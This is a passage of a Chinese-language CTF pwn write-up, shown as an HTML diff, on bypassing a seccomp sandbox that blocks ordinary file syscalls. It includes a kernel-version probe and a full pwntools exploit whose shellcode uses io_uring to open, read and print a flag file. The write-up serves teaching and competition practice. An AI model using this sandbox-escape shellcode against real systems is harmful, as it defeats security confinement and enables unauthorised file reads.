+</span></span><span class="line"><span class="cl"> 0027: 0x06 0x00 0x00 0x00000000  <span class="k">return</span> KILL</span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><h3 class="heading-element" id="确定内核版本"><span>确定内核版本</span>
+  <a href="#%e7%a1%ae%e5%ae%9a%e5%86%85%e6%a0%b8%e7%89%88%e6%9c%ac" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>首先需要确定内核版本</p>
+<p>确定内核版本的方法：</p>
+<p>以我本地为例，我的内核版本<code> 6.6.87</code>，但是我去调用一些新内核版本才有的系统调用：</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shellcode = asm(&#39;&#39;&#39;
+</span></span><span class="line"><span class="cl">    mov rax, 454
+</span></span><span class="line"><span class="cl">    xor rdi, rdi
+</span></span><span class="line"><span class="cl">    xor rsi, rsi
+</span></span><span class="line"><span class="cl">    xor rdx, rdx
+</span></span><span class="line"><span class="cl">    syscall
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    &#39;&#39;&#39;)</span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>这个syscall的返回值存在RAX是：<code>0xffffffffffffffda</code>，在 64 位有符号数下就是 <code>-38</code>。表示 <strong><code>syscall</code> 返回了 -ENOSYS，说明该系统调用在你这个内核版本中不存在</strong>。</p>
+<p>远程的话不会回显，可以通过 <code>cmp rax, -38</code>判断，如果ENOSYS就wirte一些信息</p>
+<h3 class="heading-element" id="寻找代替系统调用"><span>寻找代替系统调用</span>
+  <a href="#%e5%af%bb%e6%89%be%e4%bb%a3%e6%9b%bf%e7%b3%bb%e7%bb%9f%e8%b0%83%e7%94%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>由于禁掉了常用的一些orw系统调用，需要去寻找其他替代的系统调用来orw</p>
+<p>别人测得的版本小于 <code>6.1.60</code></p>
+<p>以 <code>linux-5.15.137</code> 为参考</p>
+<p>深入<code>SYS_openat</code>后发现，其主要逻辑是调用<code>do_filp_open</code>，而<code>do_file_open</code>又会被<code>io_uring.c</code>这个文件调用。</p>
+<p>了解<code>io_uring</code>之后发现其能够替代orw，至此，确定了通过<code>io_uring</code>实现orw</p>
+<h3 class="heading-element" id="实现"><span>实现</span>
+  <a href="#%e5%ae%9e%e7%8e%b0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><code>liburing</code>提供了对底层系统调用的封装，但是看了看，还是觉得直接用系统调用写shellcode比较简单，这里直接用模板</p>
+<p>exp:</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-python"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="3" style="--fi-max-shown-lines:10;--fi-line-digit:3;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;tmux&#34;</span><span class="p">,</span> <span class="s2">&#34;splitw&#34;</span><span class="p">,</span> <span class="s2">&#34;-h&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># pause()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">address</span> <span class="o">=</span> <span class="s1">&#39;./pwn&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">address</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">address</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># ip = &#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># port = </span>
+</span></span><span class="line"><span class="cl"><span class="c1">#p = remote(ip,port)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">/*视情况调整栈帧*/
+</span></span></span><span class="line"><span class="cl"><span class="s2">    add rsp, 0x2000
+</span></span></span><span class="line"><span class="cl"><span class="s2">/*int uring_fd = syscall(SYS_io_uring_setup, 16, &amp;params);*/
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rax, 0
+</span></span></span><span class="line"><span class="cl"><span class="s2">    lea rdi, [rsp+0x100]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rcx, 15
+</span></span></span><span class="line"><span class="cl"><span class="s2">    rep stosq
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdi, 16
+</span></span></span><span class="line"><span class="cl"><span class="s2">    lea rsi, [rsp+0x100]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rax, 0x1a9
+</span></span></span><span class="line"><span class="cl"><span class="s2">    syscall
+</span></span></span><span class="line"><span class="cl"><span class="s2">/*unsigned char *sq_ring = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQ_RING);*/
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov qword ptr [rsp+0x200], rax
+</span></span></span><span class="line"><span class="cl"><span class="s2">    xor rdi, rdi
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rsi, 0x1000
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdx, 3
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov r10, 1
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov r8, qword ptr [rsp+0x200]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov r9, 0
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rax, 9
+</span></span></span><span class="line"><span class="cl"><span class="s2">    syscall
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov qword ptr [rsp+0x208], rax
+</span></span></span><span class="line"><span class="cl"><span class="s2">/*unsigned char *cq_ring = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_CQ_RING);*/
+</span></span></span><span class="line"><span class="cl"><span class="s2">    xor rdi, rdi
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rsi, 0x1000
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdx, 3
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov r10, 1
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov r8, qword ptr [rsp+0x200]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov r9, 0x8000000
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rax, 9
+</span></span></span><span class="line"><span class="cl"><span class="s2">    syscall
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov qword ptr [rsp+0x210], rax
+</span></span></span><span class="line"><span class="cl"><span class="s2">/*struct io_uring_sqe *sqes = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQES);*/
+</span></span></span><span class="line"><span class="cl"><span class="s2">    xor rdi, rdi
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rsi, 0x1000
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdx, 3
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov r10, 1
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov r8, qword ptr [rsp+0x200]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov r9, 0x10000000
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rax, 9
+</span></span></span><span class="line"><span class="cl"><span class="s2">    syscall
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov qword ptr [rsp+0x218], rax
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">/*openat*/
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rax, 0
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdi, qword ptr [rsp+0x218]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rcx, 8
+</span></span></span><span class="line"><span class="cl"><span class="s2">    rep stosq
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdi, qword ptr [rsp+0x218]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov byte ptr [rdi], 18 	/*opcode*/
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov byte ptr [rdi+1], 0	/* IOSQE_ flags*/
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov dword ptr [rdi+4], -100	/* file descriptor to do IO on */
+</span></span></span><span class="line"><span class="cl"><span class="s2">    /* 要打开文件的路径存放在 rsp+0x300 处 */
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rax, 0x67616c662f2e
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov qword ptr [rsp+0x300], rax
+</span></span></span><span class="line"><span class="cl"><span class="s2">    lea rax, [rsp+0x300]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov qword ptr [rdi+16], rax /*pathname*/
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov dword ptr [rdi+28], 0	/*open_flag*/
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdi, qword ptr [rsp+0x208]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov edx, dword ptr [rsp+0x140]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    add rdi, rdx
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov dword ptr [rdi], 0
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdi, qword ptr [rsp+0x208]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov edx, dword ptr [rsp+0x12c]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    add rdi, rdx
+</span></span></span><span class="line"><span class="cl"><span class="s2">    add dword ptr [rdi], 1
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdi, qword ptr [rsp+0x200]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rsi, 1
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdx, 1
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov r10, 1
+</span></span></span><span class="line"><span class="cl"><span class="s2">    xor r8, r8
+</span></span></span><span class="line"><span class="cl"><span class="s2">    xor r9, r9
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rax, 0x1aa
+</span></span></span><span class="line"><span class="cl"><span class="s2">    syscall
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdi, qword ptr [rsp+0x210]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov edx, dword ptr [rsp+0x164]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    add rdi, rdx
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov edx, dword ptr [rdi+8]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov qword ptr [rsp+0x220], rdx
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2"> /*read*/
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rax, 0
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdi, qword ptr [rsp+0x218]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rcx, 8
+</span></span></span><span class="line"><span class="cl"><span class="s2">    rep stosq
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdi, qword ptr [rsp+0x218]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov byte ptr [rdi], 22
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rax, qword ptr [rsp+0x220]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov dword ptr [rdi+4], eax
+</span></span></span><span class="line"><span class="cl"><span class="s2">    lea rax, [rsp+0x300]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov qword ptr [rdi+16], rax
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov dword ptr [rdi+24], 0x100
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdi, qword ptr [rsp+0x208]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov edx, dword ptr [rsp+0x140]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    add rdi, rdx
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov dword ptr [rdi], 0
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdi, qword ptr [rsp+0x208]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov edx, dword ptr [rsp+0x12c]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    add rdi, rdx
+</span></span></span><span class="line"><span class="cl"><span class="s2">    add dword ptr [rdi], 1
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdi, qword ptr [rsp+0x200]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rsi, 1
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdx, 1
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov r10, 1
+</span></span></span><span class="line"><span class="cl"><span class="s2">    xor r8, r8
+</span></span></span><span class="line"><span class="cl"><span class="s2">    xor r9, r9
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rax, 0x1aa
+</span></span></span><span class="line"><span class="cl"><span class="s2">    syscall
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">/*write*/
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rax, 0
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdi, qword ptr [rsp+0x218]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rcx, 8
+</span></span></span><span class="line"><span class="cl"><span class="s2">    rep stosq
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdi, qword ptr [rsp+0x218]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov byte ptr [rdi], 23
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov dword ptr [rdi+4], 1
+</span></span></span><span class="line"><span class="cl"><span class="s2">    lea rax, [rsp+0x300]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov qword ptr [rdi+16], rax
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov dword ptr [rdi+24], 0x100
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdi, qword ptr [rsp+0x208]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov edx, dword ptr [rsp+0x140]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    add rdi, rdx
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov dword ptr [rdi], 0
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdi, qword ptr [rsp+0x208]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov edx, dword ptr [rsp+0x12c]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    add rdi, rdx
+</span></span></span><span class="line"><span class="cl"><span class="s2">    add dword ptr [rdi], 1
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdi, qword ptr [rsp+0x200]
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rsi, 1
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rdx, 3
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov r10, 1
+</span></span></span><span class="line"><span class="cl"><span class="s2">    xor r8, r8
+</span></span></span><span class="line"><span class="cl"><span class="s2">    xor r9, r9
+</span></span></span><span class="line"><span class="cl"><span class="s2">    mov rax, 0x1aa
+</span></span></span><span class="line"><span class="cl"><span class="s2">    syscall
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;code</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># dbg()</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><p>可能要多打几次才能打通</p>
+<h2 class="heading-element" id="参考文章"><span>参考文章</span>
+  <a href="#%e5%8f%82%e8%80%83%e6%96%87%e7%ab%a0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><a href="https://www.yuque.com/xiaocangxu/pwn/pd2zc37ebgbanvau#vqGHAs" target="_blank" rel="external nofollow noopener noreferrer">https://www.yuque.com/xiaocangxu/pwn/pd2zc37ebgbanvau#vqGHAs</a></p>
+<p><a href="https://kernel.dk/io_uring.pdf" target="_blank" rel="external nofollow noopener noreferrer">https://kernel.dk/io_uring.pdf</a></p>
+<p><a href="https://arthurchiao.art/blog/intro-to-io-uring-zh/" target="_blank" rel="external nofollow noopener noreferrer">[译] Linux 异步 I/O 框架 io_uring：基本原理、程序示例与性能压测（2020）</a></p>
+<p><a href="https://blog.xmcve.com/2023/10/31/ACTF-2023-Writeup/#title-9" target="_blank" rel="external nofollow noopener noreferrer">星盟WP</a></p></div><div class="post-footer" id="post-footer">
